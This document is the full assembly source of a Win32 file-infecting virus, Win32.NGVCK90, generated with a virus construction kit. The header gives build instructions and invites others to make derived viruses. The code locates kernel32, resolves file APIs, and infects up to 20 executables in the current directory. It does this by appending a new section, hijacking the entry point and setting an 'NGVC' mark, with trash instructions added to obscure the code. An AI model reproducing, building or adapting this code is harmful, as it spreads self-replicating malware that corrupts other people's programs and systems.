              
;
;
; Win32.NGVCK90 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK90
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 41
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 add esp, 4d
                                        ; mov ebp, edx
 push edx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop edi

 mov dword ptr [ebp+retEIP], edi

                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 sub ebp, 1
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 push ecx
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 and edx, ebx                           ; Trash
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 3234d
 sub edx, 3234d
 mov ecx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret
 or ebx, 37735585d                      ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push esi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edx, edi

 push edx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg edx, edi

                                        ; mov eax, 276
 mov eax, ( 276d - 36d )
 add eax, 36d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec eax
 jnz ClearOldData2
 popad
ret





;                  [ ///// * Data * \\\\\ ]

Data:
 counter     dw 0h
 Trash1      dd 0h
 KernelPE    dd 0h
 db 'Virus : Win32.NGVCK90 Author : SnakeByte',0

 AlignReg1   dd 0h
 NTableVA    dd 0h
 NTableTemp  dd 0h
 KernelMZ    dd 0h
 TempApisearch2 dd 0h
 Misc1       dd 0h
 PEheader    dd 0h
 K32Trys     dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 filemask    db '*.eXe',0
 TempAPI     dd 0h
 AlignTemp   dd 0h
 InfCounter  dd 0h
 sectionalign   dd 0h
 AlignReg2   dd 0h

 APINames:
 db 'CreateFileMappingA', 0
 db 'UnmapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0
 db 'FindFirstFileA', 0
 db 'FindClose', 0
 db 'CreateFileA', 0
 db 'CloseHandle', 0

 MapAddress  dd 0h
 MapHandle   dd 0h
 TempApisearch3 dd 0h
 OldEIP      dd 0h

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XCreateFileA           dd 0h
 XCloseHandle           dd 0h

 ATableVA    dd 0h
 NewEIP      dd 0h
 OldBase     dd 400000h
 FileHandle  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FindHandle  dd 0h
 NewSize     dd 0h
 filealign   dd 0h
 OTableVA    dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 sub edx, edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 add edx, 1d
 push edx
 push 80000000h or 40000000h
 add dword ptr [ebp+Trash1], ebx        ; Trash
 lea edi, [ebp+WFD_szFileName]
 xchg esi, edi

 push esi
 neg ecx                                ; Trash
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx
 push 0
 push ebx
 neg edx                                ; Trash
 push 0
                                        ; mov ecx, 4
 mov ecx, ( 4d xor 18d )
 xor ecx, 18d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 cmp eax, 0
 je CloseFile
 push ebx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 add ecx, eax                           ; Trash
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; eax Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h



 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [edi+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
                                        ; get NTableVA
 mov edi, dword ptr [ebx]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ebx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 push dword ptr [ebp+NTableVA]
 pop ecx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ecx
 mov ebx, dword ptr [ecx]
 add ebx, [ebp+KernelMZ]
                                        ; mov ecx, ebx
                                        ; clear ecx
 mov ecx, 0
 add ecx, ebx
                                        ; mov esi, ebx
                                        ; clear esi
 xor esi, esi
 add esi, ebx
 push edx
 mov dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov bh, byte ptr [eax]
 cmp bh, byte ptr [esi]
 jne ApiNotFound
 add edx, -1
 or edx, edx
 jz FoundApi1
                                        ; add esi, 1
 inc esi
                                        ; add eax, 1
 sub eax, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edx
                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+TempApisearch2]
 mov ecx, dword ptr [ebp+NTableTemp]
                                        ; clear eax
 sub eax, eax
 add eax, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop ecx
 movzx ebx, word ptr [ecx]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop ecx
 add ecx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 mov esi, offset APIOffsets
 add esi, ebp

 mov eax, ebp
 add eax, offset APINames


GetApisLoop: 

 push eax
 pop edx
APINameDetect:                          ; calculate the lenght of the names
 inc edx
 cmp byte ptr [edx], 0
 jne APINameDetect

 sub edx, eax
                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; eax points to the Name
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add eax, 1
 add eax, 1d
 add eax, edx
 mov edi, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], -1
 and dword ptr [esi], edi
                                        ; add esi, 4
 inc esi
 add esi, 3d
 dec ecx
 jnz GetApisLoop
 lea esi, [ebp+Outbreak]

 push esi
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je Goodfile
                                        ; mov ebx, 25026
 mov ebx, 0
 add ebx, 25026d
 or ebx, ebx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [edx+3Ch], 0h
 je Notagoodfile
                                        ; clear ebx
 mov ebx, -24390d
 add ebx, 24390d
 add ebx, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp ebx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ebx, edx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear eax
 and eax, 0
 dec eax
 inc eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov esi, dword ptr [esp]
                                        ; round to pages
 ror esi, 16d
 shl esi, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6657
 sub dword ptr [ebp+K32Trys], 657d

GK1:                                    ; check for DOS-EXE Stub
 push dword ptr [ebp+K32Trys]
 pop eax
 cmp eax, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je CheckPE

GK2:
                                        ; mov ebx, 65536
 push 65536d
 pop ebx
 sub esi, ebx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov ecx, [esi]
 sub esi, 60d
 add ecx, esi
                                        ; check for EP
 cmp word ptr [ecx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add ecx, 22
 add ecx, 22d
                                        ; clear ebx
 mov ebx, -34062d
 add ebx, 34062d
 movzx ebx, word ptr [ecx]
 and bx, 0F000h
 cmp bx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 dec ecx
 sub ecx, 21d


KernelFound:
 or edx, 28656996d                      ; Trash
 mov dword ptr [ebp+KernelPE], ecx
 mov dword ptr [ebp+KernelMZ], esi

 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [ebx+3Ch]
 add eax, ebx
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov ebx, [eax]
 inc eax
 sub eax, 61d
 mov dword ptr [ebp+filealign], ebx
 sub ecx, ebx                           ; Trash
                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 add dword ptr [ebp+PEheader], ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [ebx+34h]
 push edx
 pop dword ptr [ebp+OldBase]
 mov ecx, dword ptr [ebx+28h]
 mov dword ptr [ebp+OldEIP], ecx
 mov eax, [ebx+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+sectionalign], eax
                                        ; Get last section
 mov edx, [ebx+74h]
 shl edx, 3
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [ebx+6h]
 mov eax, 28h
 pushad
 mov eax, ecx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
 mov ecx, dword ptr [ebp+Misc1]
 add ebx, 78h
 add ebx, edx
 add ebx, ecx
 lea edx, [ebp+newsection]


 xchg edx, ebx
 push edx
                                        ; Calculate the RVA of the new section
 mov eax, [edx-5*8+8d]
 add eax, [edx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], eax
 push ebx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], eax
 and ecx, ebx                           ; Trash
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov ebx,[edx-5*8+20d]
 add ebx,[edx-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
                                        ; mov edx, -1
 mov edx, ( -1d xor 31d )
 xor edx, 31d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+filealign]
 mov ecx, edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], ebx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 pop edx
 lea eax, [ebp+newsection]
 xchg eax, edi

                                        ; mov ebx, 16
 mov ebx, 16d
WriteNewSectionLoop:
 push dword ptr [edi]
 pop dword ptr [edx]
                                        ; add edx, 4
 add edx, 4d
                                        ; add edi, 4
 add edi, 4d
 add ebx, -1
 test ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov eax, dword ptr [ebp+PEheader]
 inc word ptr [eax+06h]
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [eax+28h], edx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], -1d
 and dword ptr [eax+4Ch], 'NGVC'
 mov ebx, dword ptr [ebp+nsphysicaloffset]
 push ebx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea esi, [ebp+Virus]


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop edx
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, 30301d
 sub ecx, 30301d
 push ecx
 call ExitProcess



end FakeCode

